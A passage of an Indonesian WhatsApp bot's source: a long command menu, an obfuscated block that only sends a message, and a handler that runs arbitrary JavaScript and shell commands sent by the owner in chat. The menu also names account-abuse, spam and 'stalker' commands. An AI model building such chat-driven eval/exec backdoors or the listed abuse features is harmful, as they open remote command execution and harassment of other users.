║⫸ ➪◇ ‣ ${prefix}bcgc
║⫸ ➪◇ ‣ ${prefix}bc
║⫸ ➪◇ ‣ ${prefix}addprem
║⫸ ➪◇ ‣ ${prefix}delprem
║⫸ ➪◇ ‣ ${prefix}addvn
║⫸ ➪◇ ‣ ${prefix}delvn
║⫸ ➪◇ ‣ ${prefix}myip
║⫸ ➪◇ ‣ ${prefix}chat
║⫸ ➪◇ ‣ ${prefix}react
║⫸ ➪◇ ‣ ${prefix}shutdown
║⫸ ➪◇ ‣ ${prefix}join
║⫸ ➪◇ ‣ ${prefix}leave
║⫸ ➪◇ ‣ ${prefix}setexif
║⫸ ➪◇ ‣ ${prefix}setppbot
║⫸ ➪◇ ‣ ${prefix}setppbot full
║⫸ ➪◇ ‣ ${prefix}setnamabot
║⫸ ➪◇ ‣ ${prefix}setbiobot
║⫸ ➪◇ ‣ ${prefix}block
║⫸ ➪◇ ‣ ${prefix}unblock
╚━═━═━═━═━═━═━═━≫
◇ ‣  >
◇ ‣  =>

タ *F U N   M E N U*
▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}apakah
║⫸ ➪◇ ‣ ${prefix}bisakah
║⫸ ➪◇ ‣ ${prefix}bagaimanakah
║⫸ ➪◇ ‣ ${prefix}rate
║⫸ ➪◇ ‣ ${prefix}gantengcek
║⫸ ➪◇ ‣ ${prefix}cekganteng
║⫸ ➪◇ ‣ ${prefix}cantikcek
║⫸ ➪◇ ‣ ${prefix}cekcantik
║⫸ ➪◇ ‣ ${prefix}sangecek
║⫸ ➪◇ ‣ ${prefix}ceksange
║⫸ ➪◇ ‣ ${prefix}gaycek
║⫸ ➪◇ ‣ ${prefix}cekgay
║⫸ ➪◇ ‣ ${prefix}lesbicek
║⫸ ➪◇ ‣ ${prefix}ceklesbi
║⫸ ➪◇ ‣ ${prefix}kapankah
║⫸ ➪◇ ‣ ${prefix}wangy
║⫸ ➪◇ ‣ ${prefix}cekmati
║⫸ ➪◇ ‣ ${prefix}halah
║⫸ ➪◇ ‣ ${prefix}hilih
║⫸ ➪◇ ‣ ${prefix}huluh
║⫸ ➪◇ ‣ ${prefix}heleh
║⫸ ➪◇ ‣ ${prefix}holoh
╚━═━═━═━═━═━═━═━≫

タ *M A I N  M E N U*
▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}owner
║⫸ ➪◇ ‣ ${prefix}ping
║⫸ ➪◇ ‣ ${prefix}menu
║⫸ ➪◇ ‣ ${prefix}speedtest
║⫸ ➪◇ ‣ ${prefix}script
║⫸ ➪◇ ‣ ${prefix}tqto
║⫸ ➪◇ ‣ ${prefix}runtime
║⫸ ➪◇ ‣ ${prefix}ceklimit
╚━═━═━═━═━═━═━═━≫

タ *P R I M B O N  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}nomorhoki
║⫸ ➪◇ ‣ ${prefix}artimimpi
║⫸ ➪◇ ‣ ${prefix}artinama
║⫸ ➪◇ ‣ ${prefix}ramaljodoh
║⫸ ➪◇ ‣ ${prefix}ramaljodohbali
║⫸ ➪◇ ‣ ${prefix}suamiistri
║⫸ ➪◇ ‣ ${prefix}ramalcinta
║⫸ ➪◇ ‣ ${prefix}cocoknama
║⫸ ➪◇ ‣ ${prefix}pasangan
║⫸ ➪◇ ‣ ${prefix}jadiannikah
║⫸ ➪◇ ‣ ${prefix}sifatusaha
║⫸ ➪◇ ‣ ${prefix}rezeki
║⫸ ➪◇ ‣ ${prefix}pekerjaan
║⫸ ➪◇ ‣ ${prefix}nasib
║⫸ ➪◇ ‣ ${prefix}penyakit
║⫸ ➪◇ ‣ ${prefix}tarot
║⫸ ➪◇ ‣ ${prefix}fengshui
║⫸ ➪◇ ‣ ${prefix}haribaik
║⫸ ➪◇ ‣ ${prefix}harisangar
║⫸ ➪◇ ‣ ${prefix}harisial
║⫸ ➪◇ ‣ ${prefix}nagahari
║⫸ ➪◇ ‣ ${prefix}arahrezeki
║⫸ ➪◇ ‣ ${prefix}peruntungan
║⫸ ➪◇ ‣ ${prefix}weton
║⫸ ➪◇ ‣ ${prefix}karakter
║⫸ ➪◇ ‣ ${prefix}keberuntungan
║⫸ ➪◇ ‣ ${prefix}memancing
║⫸ ➪◇ ‣ ${prefix}masasubur
║⫸ ➪◇ ‣ ${prefix}zodiak
║⫸ ➪◇ ‣ ${prefix}shio
╚━═━═━═━═━═━═━═━≫

タ *G R O U P  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}kick
║⫸ ➪◇ ‣ ${prefix}add
║⫸ ➪◇ ‣ ${prefix}culik
║⫸ ➪◇ ‣ ${prefix}promote
║⫸ ➪◇ ‣ ${prefix}demote
║⫸ ➪◇ ‣ ${prefix}setname
║⫸ ➪◇ ‣ ${prefix}setdesc
║⫸ ➪◇ ‣ ${prefix}setppgc
║⫸ ➪◇ ‣ ${prefix}tagall
║⫸ ➪◇ ‣ ${prefix}hidetag
║⫸ ➪◇ ‣ ${prefix}totag
║⫸ ➪◇ ‣ ${prefix}antilink
║⫸ ➪◇ ‣ ${prefix}antilinkyt
║⫸ ➪◇ ‣ ${prefix}antilinktt
║⫸ ➪◇ ‣ ${prefix}mutegc
║⫸ ➪◇ ‣ ${prefix}ephemeral
║⫸ ➪◇ ‣ ${prefix}group
║⫸ ➪◇ ‣ ${prefix}editinfo
║⫸ ➪◇ ‣ ${prefix}linkgc
║⫸ ➪◇ ‣ ${prefix}revoke
║⫸ ➪◇ ‣ ${prefix}liston
╚━═━═━═━═━═━═━═━≫

タ *R A M D O N  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}art
║⫸ ➪◇ ‣ ${prefix}bts
║⫸ ➪◇ ‣ ${prefix}exo
║⫸ ➪◇ ‣ ${prefix}elf
║⫸ ➪◇ ‣ ${prefix}loli
║⫸ ➪◇ ‣ ${prefix}neko
║⫸ ➪◇ ‣ ${prefix}waifu
║⫸ ➪◇ ‣ ${prefix}shota
║⫸ ➪◇ ‣ ${prefix}husbu
║⫸ ➪◇ ‣ ${prefix}sagiri
║⫸ ➪◇ ‣ ${prefix}shinobu
║⫸ ➪◇ ‣ ${prefix}megumin
║⫸ ➪◇ ‣ ${prefix}wallnime
║⫸ ➪◇ ‣ ${prefix}pokemon
║⫸ ➪◇ ‣ ${prefix}rize
║⫸ ➪◇ ‣ ${prefix}sagiri
║⫸ ➪◇ ‣ ${prefix}aesthetic
║⫸ ➪◇ ‣ ${prefix}anjing
║⫸ ➪◇ ‣ ${prefix}blankpink
║⫸ ➪◇ ‣ ${prefix}boneka
║⫸ ➪◇ ‣ ${prefix}hekel
║⫸ ➪◇ ‣ ${prefix}justina
║⫸ ➪◇ ‣ ${prefix}kpop
║⫸ ➪◇ ‣ ${prefix}kucing
║⫸ ➪◇ ‣ ${prefix}mobil
║⫸ ➪◇ ‣ ${prefix}motor
║⫸ ➪◇ ‣ ${prefix}pubg
║⫸ ➪◇ ‣ ${prefix}rose
║⫸ ➪◇ ‣ ${prefix}ryujin
║⫸ ➪◇ ‣ ${prefix}wallhp
║⫸ ➪◇ ‣ ${prefix}cyberspace
║⫸ ➪◇ ‣ ${prefix}mountain
║⫸ ➪◇ ‣ ${prefix}programming
║⫸ ➪◇ ‣ ${prefix}technology 
║⫸ ➪◇ ‣ ${prefix}couple
║⫸ ➪◇ ‣ ${prefix}wallpaper
╚━═━═━═━═━═━═━═━≫

タ *A S U P A N  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}cecan
║⫸ ➪◇ ‣ ${prefix}china
║⫸ ➪◇ ‣ ${prefix}cogan
║⫸ ➪◇ ‣ ${prefix}indonesia
║⫸ ➪◇ ‣ ${prefix}japan
║⫸ ➪◇ ‣ ${prefix}korea
║⫸ ➪◇ ‣ ${prefix}malaysia
║⫸ ➪◇ ‣ ${prefix}thailand
║⫸ ➪◇ ‣ ${prefix}vietnam
╚━═━═━═━═━═━═━═━≫
タ *T O O L S  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}style
║⫸ ➪◇ ‣ ${prefix}delete
║⫸ ➪◇ ‣ ${prefix}ssweb
║⫸ ➪◇ ‣ ${prefix}ssweb2
║⫸ ➪◇ ‣ ${prefix}shortlink
║⫸ ➪◇ ‣ ${prefix}quoted
║⫸ ➪◇ ‣ ${prefix}ebinary
║⫸ ➪◇ ‣ ${prefix}dbinary
║⫸ ➪◇ ‣ ${prefix}wikimedia
║⫸ ➪◇ ‣ ${prefix}bass
║⫸ ➪◇ ‣ ${prefix}blown
║⫸ ➪◇ ‣ ${prefix}deep
║⫸ ➪◇ ‣ ${prefix}earrape
║⫸ ➪◇ ‣ ${prefix}fast
║⫸ ➪◇ ‣ ${prefix}fat
║⫸ ➪◇ ‣ ${prefix}nightcore
║⫸ ➪◇ ‣ ${prefix}reverse
║⫸ ➪◇ ‣ ${prefix}robot
║⫸ ➪◇ ‣ ${prefix}slow
║⫸ ➪◇ ‣ ${prefix}tupai
╚━═━═━═━═━═━═━═━≫

タ *C R E A T O R  I M A G E*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}tololsertifikat
║⫸ ➪◇ ‣ ${prefix}bucinsertifikat
║⫸ ➪◇ ‣ ${prefix}pacarsertifikat
║⫸ ➪◇ ‣ ${prefix}ttp
║⫸ ➪◇ ‣ ${prefix}attp
║⫸ ➪◇ ‣ ${prefix}attp2
║⫸ ➪◇ ‣ ${prefix}qcimg
║⫸ ➪◇ ‣ ${prefix}qc
╚━═━═━═━═━═━═━═━≫

タ *I S L A M  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}asmaulhusna
║⫸ ➪◇ ‣ ${prefix}alquranaudio
║⫸ ➪◇ ‣ ${prefix}alquran
║⫸ ➪◇ ‣ ${prefix}jadwalsolat
║⫸ ➪◇ ‣ ${prefix}kisahnabi
║⫸ ➪◇ ‣ ${prefix}listsurah
║⫸ ➪◇ ‣ ${prefix}iqro
║⫸ ➪◇ ‣ ${prefix}juzamma
║⫸ ➪◇ ‣ ${prefix}hadist
║⫸ ➪◇ ‣ ${prefix}tasfirsurah
╚━═━═━═━═━═━═━═━≫

タ *D O W N  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
║⫸ ➪◇ ‣ ${prefix}ytplay
║⫸ ➪◇ ‣ ${prefix}ytmp3
║⫸ ➪◇ ‣ ${prefix}ytmp4
║⫸ ➪◇ ‣ ${prefix}tiktok
║⫸ ➪◇ ‣ ${prefix}tiktokaudio
║⫸ ➪◇ ‣ ${prefix}igdl
║⫸ ➪◇ ‣ ${prefix}igdl2
║⫸ ➪◇ ‣ ${prefix}twtdl
║⫸ ➪◇ ‣ ${prefix}fbdl
║⫸ ➪◇ ‣ ${prefix}gitclone
╚━═━═━═━═━═━═━═━≫

タ *E P H O T O _1_*
▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}wetglass
║⫸ ➪◇ ‣ ${prefix}multicolor3d
║⫸ ➪◇ ‣ ${prefix}watercolor
║⫸ ➪◇ ‣ ${prefix}luxurygold
║⫸ ➪◇ ‣ ${prefix}galaxywallpaper
║⫸ ➪◇ ‣ ${prefix}lighttext
║⫸ ➪◇ ‣ ${prefix}beautifulflower
║⫸ ➪◇ ‣ ${prefix}puppycute
║⫸ ➪◇ ‣ ${prefix}royaltext
║⫸ ➪◇ ‣ ${prefix}heartshaped
║⫸ ➪◇ ‣ ${prefix}birthdaycake
║⫸ ➪◇ ‣ ${prefix}galaxystyle
║⫸ ➪◇ ‣ ${prefix}hologram3d
║⫸ ➪◇ ‣ ${prefix}greenneon
║⫸ ➪◇ ‣ ${prefix}glossychrome
║⫸ ➪◇ ‣ ${prefix}greenbush
║⫸ ➪◇ ‣ ${prefix}metallogo
║⫸ ➪◇ ‣ ${prefix}noeltext
║⫸ ➪◇ ‣ ${prefix}glittergold
║⫸ ➪◇ ‣ ${prefix}textcake
║⫸ ➪◇ ‣ ${prefix}starsnight
║⫸ ➪◇ ‣ ${prefix}wooden3d
║⫸ ➪◇ ‣ ${prefix}textbyname
║⫸ ➪◇ ‣ ${prefix}writegalacy
║⫸ ➪◇ ‣ ${prefix}galaxybat
║⫸ ➪◇ ‣ ${prefix}snow3d
║⫸ ➪◇ ‣ ${prefix}birthdayday
║⫸ ➪◇ ‣ ${prefix}goldplaybutton
║⫸ ➪◇ ‣ ${prefix}silverplaybutton
║⫸ ➪◇ ‣ ${prefix}freefire
╚━═━═━═━═━═━═━═━≫
タ *P H O T O  O X Y _1_*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}shadow
║⫸ ➪◇ ‣ ${prefix}cup
║⫸ ➪◇ ‣ ${prefix}cup1
║⫸ ➪◇ ‣ ${prefix}romance
║⫸ ➪◇ ‣ ${prefix}smoke
║⫸ ➪◇ ‣ ${prefix}burnpaper
║⫸ ➪◇ ‣ ${prefix}lovemessage
║⫸ ➪◇ ‣ ${prefix}undergrass
║⫸ ➪◇ ‣ ${prefix}love
║⫸ ➪◇ ‣ ${prefix}coffe
║⫸ ➪◇ ‣ ${prefix}woodheart
║⫸ ➪◇ ‣ ${prefix}woodenboard
║⫸ ➪◇ ‣ ${prefix}summer3d
║⫸ ➪◇ ‣ ${prefix}wolfmetal
║⫸ ➪◇ ‣ ${prefix}nature3d
║⫸ ➪◇ ‣ ${prefix}underwater
║⫸ ➪◇ ‣ ${prefix}golderrose
║⫸ ➪◇ ‣ ${prefix}summernature
║⫸ ➪◇ ‣ ${prefix}letterleaves
║⫸ ➪◇ ‣ ${prefix}glowingneon
║⫸ ➪◇ ‣ ${prefix}fallleaves
║⫸ ➪◇ ‣ ${prefix}flamming
║⫸ ➪◇ ‣ ${prefix}harrypotter
║⫸ ➪◇ ‣ ${prefix}carvedwood
╚━═━═━═━═━═━═━═━≫

タ *T E X T  P R O _1_*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}blackpink
║⫸ ➪◇ ‣ ${prefix}neon
║⫸ ➪◇ ‣ ${prefix}greenneon
║⫸ ➪◇ ‣ ${prefix}advanceglow
║⫸ ➪◇ ‣ ${prefix}futureneon
║⫸ ➪◇ ‣ ${prefix}sandwriting
║⫸ ➪◇ ‣ ${prefix}sandsummer
║⫸ ➪◇ ‣ ${prefix}sandengraved
║⫸ ➪◇ ‣ ${prefix}metaldark
║⫸ ➪◇ ‣ ${prefix}neonlight
║⫸ ➪◇ ‣ ${prefix}holographic
║⫸ ➪◇ ‣ ${prefix}text1917
║⫸ ➪◇ ‣ ${prefix}minion
║⫸ ➪◇ ‣ ${prefix}deluxesilver
║⫸ ➪◇ ‣ ${prefix}newyearcard
║⫸ ➪◇ ‣ ${prefix}bloodfrosted
║⫸ ➪◇ ‣ ${prefix}halloween
║⫸ ➪◇ ‣ ${prefix}jokerlogo
║⫸ ➪◇ ‣ ${prefix}fireworksparkle
║⫸ ➪◇ ‣ ${prefix}natureleaves
║⫸ ➪◇ ‣ ${prefix}bokeh
║⫸ ➪◇ ‣ ${prefix}toxic
║⫸ ➪◇ ‣ ${prefix}strawberry
║⫸ ➪◇ ‣ ${prefix}box3d
║⫸ ➪◇ ‣ ${prefix}roadwarning
║⫸ ➪◇ ‣ ${prefix}breakwall
║⫸ ➪◇ ‣ ${prefix}icecold
║⫸ ➪◇ ‣ ${prefix}luxury
║⫸ ➪◇ ‣ ${prefix}cloud
║⫸ ➪◇ ‣ ${prefix}summersand
║⫸ ➪◇ ‣ ${prefix}horrorblood
║⫸ ➪◇ ‣ ${prefix}thunder
╚━═━═━═━═━═━═━═━≫

タ *T E X T  P R O _2_*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}pornhub
║⫸ ➪◇ ‣ ${prefix}glitch
║⫸ ➪◇ ‣ ${prefix}avenger
║⫸ ➪◇ ‣ ${prefix}space
║⫸ ➪◇ ‣ ${prefix}ninjalogo
║⫸ ➪◇ ‣ ${prefix}marvelstudio
║⫸ ➪◇ ‣ ${prefix}lionlogo
║⫸ ➪◇ ‣ ${prefix}wolflogo
║⫸ ➪◇ ‣ ${prefix}steel3d
║⫸ ➪◇ ‣ ${prefix}wallgravity
╚━═━═━═━═━═━═━═━≫

タ *I N F O R M A T I O N*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}kbbi
║⫸ ➪◇ ‣ ${prefix}brainly
║⫸ ➪◇ ‣ ${prefix}roboguru
║⫸ ➪◇ ‣ ${prefix}jarak
║⫸ ➪◇ ‣ ${prefix}wikipedia
║⫸ ➪◇ ‣ ${prefix}translate
║⫸ ➪◇ ‣ ${prefix}jadwaltv
║⫸ ➪◇ ‣ ${prefix}jadwaltvnow
║⫸ ➪◇ ‣ ${prefix}jadwalbola
║⫸ ➪◇ ‣ ${prefix}newsinfo
║⫸ ➪◇ ‣ ${prefix}cnnindonesia
║⫸ ➪◇ ‣ ${prefix}cnnnasional
║⫸ ➪◇ ‣ ${prefix}cnninternasional
║⫸ ➪◇ ‣ ${prefix}infogempa
║⫸ ➪◇ ‣ ${prefix}infocuaca
║⫸ ➪◇ ‣ ${prefix}lirik
║⫸ ➪◇ ‣ ${prefix}kodepos
║⫸ ➪◇ ‣ ${prefix}infochat
║⫸ ➪◇ ‣ ${prefix}google
║⫸ ➪◇ ‣ ${prefix}gimage
║⫸ ➪◇ ‣ ${prefix}pinterest
╚━═━═━═━═━═━═━═━≫

タ *A N I M E  M E N U*
 ▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}genshin
║⫸ ➪◇ ‣ ${prefix}akira
║⫸ ➪◇ ‣ ${prefix}akiyama
║⫸ ➪◇ ‣ ${prefix}ana
║⫸ ➪◇ ‣ ${prefix}asuna
║⫸ ➪◇ ‣ ${prefix}ayuzawa
║⫸ ➪◇ ‣ ${prefix}boruto
║⫸ ➪◇ ‣ ${prefix}chitoge
║⫸ ➪◇ ‣ ${prefix}deidara
║⫸ ➪◇ ‣ ${prefix}doraemon
║⫸ ➪◇ ‣ ${prefix}elaina
║⫸ ➪◇ ‣ ${prefix}emilia
║⫸ ➪◇ ‣ ${prefix}erza
║⫸ ➪◇ ‣ ${prefix}gremory
║⫸ ➪◇ ‣ ${prefix}hestia
║⫸ ➪◇ ‣ ${prefix}hinata
║⫸ ➪◇ ‣ ${prefix}inori
║⫸ ➪◇ ‣ ${prefix}isuzu
║⫸ ➪◇ ‣ ${prefix}itachi
║⫸ ➪◇ ‣ ${prefix}itori
║⫸ ➪◇ ‣ ${prefix}kaga
║⫸ ➪◇ ‣ ${prefix}kagura
║⫸ ➪◇ ‣ ${prefix}kakasih
║⫸ ➪◇ ‣ ${prefix}kaori
║⫸ ➪◇ ‣ ${prefix}keneki
║⫸ ➪◇ ‣ ${prefix}kotori
║⫸ ➪◇ ‣ ${prefix}kurumi
║⫸ ➪◇ ‣ ${prefix}loli
║⫸ ➪◇ ‣ ${prefix}madara
║⫸ ➪◇ ‣ ${prefix}mikasa
║⫸ ➪◇ ‣ ${prefix}miku
║⫸ ➪◇ ‣ ${prefix}minato
║⫸ ➪◇ ‣ ${prefix}naruto
║⫸ ➪◇ ‣ ${prefix}nezuko
║⫸ ➪◇ ‣ ${prefix}onepiece
║⫸ ➪◇ ‣ ${prefix}sakura
║⫸ ➪◇ ‣ ${prefix}sasuke
║⫸ ➪◇ ‣ ${prefix}shina
║⫸ ➪◇ ‣ ${prefix}shinka
║⫸ ➪◇ ‣ ${prefix}shizuka
║⫸ ➪◇ ‣ ${prefix}shota
║⫸ ➪◇ ‣ ${prefix}toukachan
║⫸ ➪◇ ‣ ${prefix}tsunade
║⫸ ➪◇ ‣ ${prefix}yuki
╚━═━═━═━═━═━═━═━≫

タ *C O N V E R T  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}stiker
║⫸ ➪◇ ‣ ${prefix}swm
║⫸ ➪◇ ‣ ${prefix}smeme
║⫸ ➪◇ ‣ ${prefix}emojimix
║⫸ ➪◇ ‣ ${prefix}emojimix2
║⫸ ➪◇ ‣ ${prefix}toimage
║⫸ ➪◇ ‣ ${prefix}tomp4
║⫸ ➪◇ ‣ ${prefix}toaudio
║⫸ ➪◇ ‣ ${prefix}tomp3
║⫸ ➪◇ ‣ ${prefix}tovn
║⫸ ➪◇ ‣ ${prefix}togif
║⫸ ➪◇ ‣ ${prefix}tourl
╚━═━═━═━═━═━═━═━≫

タ *S T A L K E R  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}igstalk
║⫸ ➪◇ ‣ ${prefix}ttstalk
║⫸ ➪◇ ‣ ${prefix}mlstalk
║⫸ ➪◇ ‣ ${prefix}ghstalk
║⫸ ➪◇ ‣ ${prefix}twstalk
╚━═━═━═━═━═━═━═━≫

タ *N E W F I T U R  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}kenon
║⫸ ➪◇ ‣ ${prefix}unbanwa
║⫸ ➪◇ ‣ ${prefix}antipushkontakv1
║⫸ ➪◇ ‣ ${prefix}antipushkontakv2
║⫸ ➪◇ ‣ ${prefix)pushmember
╚━═━═━═━═━═━═━═━≫
Masih Dalam Tahap Perkembangan

タ *M E M E  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱
╔━═━≫
║⫸ ➪◇ ‣ ${prefix}darkjoke
║⫸ ➪◇ ‣ ${prefix}ramdommeme
║⫸ ➪◇ ‣ ${prefix}memeindo
╚━═━═━═━═━═━═━═━≫
 ▰▱▰▱▰▱▰▱▰▱▰▱
- 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙔𝙤𝙪𝙩𝙪𝙗𝙚
youtube.com/@FallXD425 ⚡⚡

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
          『 *© Fuirly-MD⚡⚡* 』
`
function _0x569b(_0x23a625, _0x245b41) {
    var _0x1e23fa = _0x1e23();
    return _0x569b = function (_0x569b64, _0x1a4c2e) {
        _0x569b64 = _0x569b64 - 0x74;
        var _0x66ad85 = _0x1e23fa[_0x569b64];
        return _0x66ad85;
    }, _0x569b(_0x23a625, _0x245b41);
}
var _0x315b9f = _0x569b;

function _0x1e23() {
    var _0x1e9d33 = ['8WTqjoe', '33pvfcha', '9833856KIdEuq', '119LNSlSN', 'sendMessage', '449hGYzAi', '446100tsCMNq', '820115urQmlM', '1084DAMzlX', '35580CPhnWx', '1934145XlNVWo', '62CyZYHM', '3261BXaaMU'];
    _0x1e23 = function () {
        return _0x1e9d33;
    };
    return _0x1e23();
}(function (_0x2443f0, _0x18f71d) {
    var _0x2d4429 = _0x569b,
        _0x506cd1 = _0x2443f0();
    while (!![]) {
        try {
            var _0x3eba50 = parseInt(_0x2d4429(0x7a)) / 0x1 * (parseInt(_0x2d4429(0x80)) / 0x2) + -parseInt(_0x2d4429(0x74)) / 0x3 * (parseInt(_0x2d4429(0x7d)) / 0x4) + parseInt(_0x2d4429(0x7c)) / 0x5 + -parseInt(_0x2d4429(0x7e)) / 0x6 * (parseInt(_0x2d4429(0x78)) / 0x7) + -parseInt(_0x2d4429(0x75)) / 0x8 * (parseInt(_0x2d4429(0x7f)) / 0x9) + -parseInt(_0x2d4429(0x7b)) / 0xa * (parseInt(_0x2d4429(0x76)) / 0xb) + parseInt(_0x2d4429(0x77)) / 0xc;
            if (_0x3eba50 === _0x18f71d) break;
            else _0x506cd1['push'](_0x506cd1['shift']());
        } catch (_0x34b074) {
            _0x506cd1['push'](_0x506cd1['shift']());
        }
    }
}(_0x1e23, 0x3dd7c), conn[_0x315b9f(0x79)](m['chat'], {
    'text': anu,
    'contextInfo': {
        'externalAdReply': {
            'showAdAttribution': !![],
            'title': ucapanWaktu + ' ' + pushname,
            'body': '' + namabot,
            'thumbnailUrl': '' + imageurl,
            'sourceUrl': '' + link,
            'mediaType': 0x1,
            'renderLargerThumbnail': !![]
        }
    }
}));
}
break
            default:
                
                if (budy.startsWith('=>')) {
                    if (!isCreator) return newReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return newReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return newReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
                
                if (isCmd && budy.toLowerCase() != undefined) {
                    if (m.chat.endsWith('broadcast')) return
                    if (m.isBaileys) return
                    let msgs = global.db.data.database
                    if (!(budy.toLowerCase() in msgs)) return
                    conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
                }
        }


    } catch (err) {
        console.log("Eror Di Bagian adrian.js "+util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})